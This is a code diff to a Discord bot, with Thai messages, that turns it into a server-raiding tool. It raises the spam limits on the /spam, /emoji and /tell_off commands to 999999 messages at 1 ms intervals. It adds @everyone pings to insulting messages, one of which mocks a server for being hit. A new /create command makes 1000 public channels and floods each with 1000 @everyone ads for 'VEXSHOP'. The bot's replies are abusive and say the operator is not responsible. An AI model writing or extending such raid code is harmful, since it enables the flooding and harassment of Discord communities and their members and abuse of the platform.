@@ -26,17 +26,17 @@ const BLOCKED_GUILD_ID = "146024011876123456";
 
 const randomMessages = [
   "",
-  "เอ๋อ",
-  "ร้องไร",
-  "ขำว่ะ",
-  "คุ้มมั้ยเนี่ย",
-  "ไอ้แหวกกอหญ้า ไอ้บ้าห้าร้อยจำพวก ไอ้ปลวกใต้หลังคา ...",
-  "จุ๊บบมั๊ววววววว",
-  "เว็กช็อปมาเว้ววว",
-  "เเค้นมั้ยถ้าเเค้นเข้าดิสมา5555",
-  "เซิฟกากๆโดนยิงได้อะตลกกก",
-  "อย่าร้องเลยสร้างใหม่ได้",
-  "ไม่เอาไม่ร้องงงงงงงมากอดมาจุ๊บบมั๊ววว",
+  "@everyone เอ๋อ",
+  "@everyone ร้องไร",
+  "@everyone กูขำว่ะ",
+  "@everyone คุ้มมั้ยเนี่ย",
+  "@everyone ไอ้แหวกกอหญ้า ไอ้บ้าห้าร้อยจำพวก ไอ้ปลวกใต้หลังคา ...",
+  "@everyone จุ๊บบมั๊ววววววว",
+  "@everyone เว็กช็อปมาเว้ววว",
+  "@everyone เเค้นมั้ยถ้าเเค้นเข้าดิสมา5555",
+  "@everyone เซิฟกากๆโดนยิงได้อะตลกกก",
+  "@everyone อย่าร้องเลยสร้างใหม่ได้",
+  "@everyone ไม่เอาไม่ร้องงงงงงงมากอดมาจุ๊บบมั๊ววว",
 ];
 
 client.once("ready", () => {
@@ -67,21 +67,21 @@ client.on("interactionCreate", async (interaction) => {
     // /spam
     if (interaction.commandName === "spam") {
       const text = interaction.options.getString("text");
-      const count = Math.min(interaction.options.getInteger("count") ?? 5, 5000);
+      const count = Math.min(interaction.options.getInteger("count") ?? 5, 999999);
 
-      await interaction.reply({ content: "เริ่มลั่น", ephemeral: true });
+      await interaction.reply({ content: "เริ่มลั่นละนะจ๊ะ มึงโดนอะหยังกูไม่เกี่ยว", ephemeral: true });
 
       for (let i = 0; i < count; i++) {
         await interaction.channel.send(text);
-        await new Promise(r => setTimeout(r, 15));
+        await new Promise(r => setTimeout(r, 1));
       }
     }
 
     // /emoji
     if (interaction.commandName === "emoji") {
       const emoji = interaction.options.getString("emoji");
-      const count = Math.min(interaction.options.getInteger("count") ?? 5, 5000);
-      const delay = Math.max(interaction.options.getInteger("delay") ?? 10, 10);
+      const count = Math.min(interaction.options.getInteger("count") ?? 5, 999999);
+      const delay = Math.max(interaction.options.getInteger("delay") ?? 1, 1);
 
       await interaction.reply({ content: "ยิง emoji", ephemeral: true });
 
@@ -96,7 +96,7 @@ client.on("interactionCreate", async (interaction) => {
       const vc = interaction.member.voice?.channel;
       if (!vc) {
         return interaction.reply({
-          content: "เข้า voice ก่อน",
+          content: "มึงเข้า vc ก่อนอันดับเเรกไอ้ควาย",
           ephemeral: true,
         });
       }
@@ -110,14 +110,14 @@ client.on("interactionCreate", async (interaction) => {
       });
 
       return interaction.reply({
-        content: `เข้าห้อง ${vc.name} แล้ว`,
+        content: `เข้าห้อง ${vc.name} แล้วอีสัส`,
         ephemeral: true
       });
     }
 
     // /tell_off
     if (interaction.commandName === "tell_off") {
-      const count = Math.min(interaction.options.getInteger("count") ?? 5, 3000);
+      const count = Math.min(interaction.options.getInteger("count") ?? 5, 999999);
 
       await interaction.reply({ content: "ยิง random", ephemeral: true });
 
@@ -125,9 +125,41 @@ client.on("interactionCreate", async (interaction) => {
         interaction.channel.send(
           randomMessages[Math.floor(Math.random() * randomMessages.length)]
         );
-        await new Promise(r => setTimeout(r, 15));
+        await new Promise(r => setTimeout(r, 1));
       }
     }
+
+    // /create (สร้างห้องโปรโมท)
+    if (interaction.commandName === "create") {
+      await interaction.reply({ content: "กำลังยิงห้องโปรโมทงับ มึงโดนไรกูไม่เกี่ยว", ephemeral: true });
+
+      const roomCount = 1000;
+      const messageCount = 1000;
+
+      for (let i = 0; i < roomCount; i++) {
+        const channel = await interaction.guild.channels.create({
+          name: `promo-${i + 1}`,
+          type: ChannelType.GuildText,
+          permissionOverwrites: [
+            {
+              id: interaction.guild.roles.everyone.id,
+              allow: [
+                PermissionsBitField.Flags.ViewChannel,
+                PermissionsBitField.Flags.SendMessages
+              ]
+            }
+          ],
+        });
+
+        for (let j = 0; j < messageCount; j++) {
+          await channel.send(
+            `@everyone ⚡ โปรโมทเซิฟดิสคอร์ด — VEXSHOP • (${j + 1}/${messageCount})`
+          );
+          await new Promise(r => setTimeout(r, 1));
+        }
+      }
+    }
+
   } catch (err) {
     console.error("ERROR:", err);
   }
